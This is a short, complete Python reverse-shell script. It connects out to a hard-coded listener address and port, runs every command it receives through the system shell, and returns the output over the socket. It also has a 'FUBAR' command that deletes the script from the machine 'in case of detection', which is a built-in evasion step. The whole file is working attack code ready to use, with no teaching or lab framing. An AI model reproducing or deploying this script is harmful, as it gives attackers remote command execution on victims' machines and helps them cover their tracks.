#!/usr/bin/env python
import subprocess, socket, sys

# Change these values to match your listening host machine
host = "192.168.1.97"
port = 2015

sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.connect((host, port))
sock.send("***Connection established, use qqq to exit***\n")

while 1:
	#Ensure this value is a (relatively) low power of 2
	data = sock.recv(4096)
	# Use this this to close the connection
	if "qqq" in data:
		break
	# In case of detection, use this to delete the file from the machine (Experimental...)
	if "FUBAR" in data:
		subprocess.Popen("python -c \"import os, time; time.sleep(1); os.remove('{}');\"".format(sys.argv[0]))
		break
	process = subprocess.Popen(data, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
	stdout_val = process.stdout.read() + process.stderr.read()
	sock.send(stdout_val)
sock.close()